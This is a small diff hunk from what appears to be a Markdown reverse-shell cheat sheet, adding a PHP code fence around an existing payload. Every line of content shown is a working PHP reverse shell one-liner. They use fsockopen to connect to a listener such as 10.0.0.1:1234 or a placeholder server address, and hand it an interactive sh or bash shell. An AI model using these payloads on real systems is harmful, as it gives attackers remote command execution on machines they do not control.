@@ -61,7 +61,9 @@ php -r '$sock=fsockopen("your.server.ip.address",8888);exec("/bin/bash -i <&3 >&
 ```
 
 - PHP fsockopen
+```php
 <?php $s=fsockopen("10.0.0.1",1234);exec("sh<&3>&3 2>&3");?>
+```
   - Direct input
 ```php
 php -r '$s=fsockopen("10.0.0.1",1234);exec("sh<&3>&3 2>&3");'
